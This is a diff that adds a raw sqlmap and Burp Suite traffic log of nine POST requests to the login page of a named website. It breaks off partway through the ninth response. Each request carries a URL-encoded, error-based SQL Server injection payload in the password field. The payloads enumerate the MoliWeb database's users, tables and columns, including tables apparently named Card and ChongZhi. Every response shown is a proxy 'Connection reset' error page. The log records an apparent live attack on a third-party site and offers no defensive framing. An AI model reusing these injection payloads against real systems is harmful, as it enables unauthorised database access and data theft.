@@ -1,0 +1,1008 @@
+HTTP request [#1]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 40
+Connection: close
+
+act=login&uid=111111&pass=123456&s=false
+
+HTTP response [#1] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#2]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 405
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%207744%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28CONCAT%28NULL%2CNULL%29%3DCONCAT%28NULL%2CNULL%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20fBTR&s=false
+
+HTTP response [#2] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#3]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 384
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204813%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%28ISJSON%28NULL%29%20IS%20NULL%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20McfB&s=false
+
+HTTP response [#3] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#4]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 1319
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%208443%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20AND%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%206%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20KuSR&s=false
+
+HTTP response [#4] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#5]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 1319
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202989%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20AND%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%207%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20GVrh&s=false
+
+HTTP response [#5] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#6]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 1319
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%202097%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20TOP%201%20SUBSTRING%28%28ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20AND%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20NOT%20IN%20%28SELECT%20TOP%208%20ISNULL%28CAST%28MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..sysobjects%20INNER%20JOIN%20MoliWeb..sysusers%20ON%20MoliWeb..sysobjects.uid%20%3D%20MoliWeb..sysusers.uid%20WHERE%20MoliWeb..sysobjects.xtype%20IN%20%28CHAR%28117%29%2CCHAR%28118%29%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%20ORDER%20BY%20MoliWeb..sysusers.name%2BCHAR%2846%29%2BMoliWeb..sysobjects.name%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20mSyY&s=false
+
+HTTP response [#6] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#7]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 561
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%205883%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%2867%29%2BCHAR%2897%29%2BCHAR%28114%29%2BCHAR%28100%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20wzGx&s=false
+
+HTTP response [#7] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#8]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 653
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%204592%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20SUBSTRING%28%28ISNULL%28CAST%28COL_NAME%28OBJECT_ID%28CHAR%2877%29%2BCHAR%28111%29%2BCHAR%28108%29%2BCHAR%28105%29%2BCHAR%2887%29%2BCHAR%28101%29%2BCHAR%2898%29%2BCHAR%2846%29%2BCHAR%28100%29%2BCHAR%2898%29%2BCHAR%28111%29%2BCHAR%2846%29%2BCHAR%2867%29%2BCHAR%2897%29%2BCHAR%28114%29%2BCHAR%28100%29%29%2C1%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%29%2C1%2C1024%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20Cdsm&s=false
+
+HTTP response [#8] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
+<div id="container">
+<div class="title"><h1>Burp Suite Professional</h1></div>
+<h1>Error</h1><p>Connection&#32;reset</p>
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
+
+
+############################################################################
+
+HTTP request [#9]:
+POST /Login.aspx HTTP/1.1
+Accept-language: en-us,en;q=0.5
+Accept-encoding: gzip,deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-agent: sqlmap/1.0.7.40#dev (http://sqlmap.org)
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: www.moli1.com
+Pragma: no-cache
+Cache-control: no-cache,no-store
+Content-type: application/x-www-form-urlencoded; charset=utf-8
+Content-length: 625
+Connection: close
+
+act=login&uid=111111&pass=123456%27%29%20AND%206203%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28118%29%2BCHAR%28113%29%2B%28SELECT%20ISNULL%28CAST%28COUNT%28%2A%29%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%20FROM%20MoliWeb..syscolumns%2CMoliWeb..sysobjects%20WHERE%20MoliWeb..syscolumns.id%3DMoliWeb..sysobjects.id%20AND%20MoliWeb..sysobjects.name%3DCHAR%2867%29%2BCHAR%28104%29%2BCHAR%28111%29%2BCHAR%28110%29%2BCHAR%28103%29%2BCHAR%2890%29%2BCHAR%28104%29%2BCHAR%28105%29%29%2BCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%20sxlY&s=false
+
+HTTP response [#9] (200 OK):
+Connection: close
+Uri: http://www.moli1.com:80/Login.aspx
+X-frame-options: DENY
+Pragma: no-cache
+Cache-control: no-cache, no-store
+
+<html><head><title>Burp Suite Professional</title>
+<style type="text/css">
+body { background: #dedede; font-family: Arial, sans-serif; color: #404042; -webkit-font-smoothing: antialiased; }
+#container { padding: 0 15px; margin: 10px auto; background-color: #ffffff; }
+table { font-family: Arial, sans-serif; table-layout: fixed; }
+p { font-size: padding: 0; margin: 0; word-wrap: break-word; }
+td { display:table-cell; vertical-align:top; word-wrap: break-word; }
+a { word-wrap: break-word; }
+a:link, a:visited { color: #e06228; text-decoration: none; }
+a:hover, a:active { color: #404042; text-decoration: underline; }
+h1 { font-size: 1.6em; line-height: 1.2em; font-weight: normal; color: #404042; }
+h2 { font-size: 1.3em; line-height: 1.2em; padding: 0; margin: 0.8em 0 0.3em 0; font-weight: normal; color: #404042;}
+.title, .navbar { color: #ffffff; background: #e06228; padding: 10px 15px; margin: 0 -15px 10px -15px; overflow: hidden; }
+.title h1 { color: #ffffff; padding: 0; margin: 0; font-size: 1.8em; }
+.request { margin: 20px 0 10px 0; padding: 10px 10px 10px 10px; font-family: "Courier New", Courier, monospace; background-color: #f8f8f8; word-wrap: break-word; }
+div.navbar {position: absolute; top: 18px; right: 25px;}div.navbar ul {list-style-type: none; margin: 0; padding: 0;}
+div.navbar li {display: inline; margi-left: 20px;}
+div.navbar a {color: white; padding: 10px}
+div.navbar a:hover, div.navbar a:active {text-decoration: none; background: #404042;}
+</style>
+</head>
+<body>
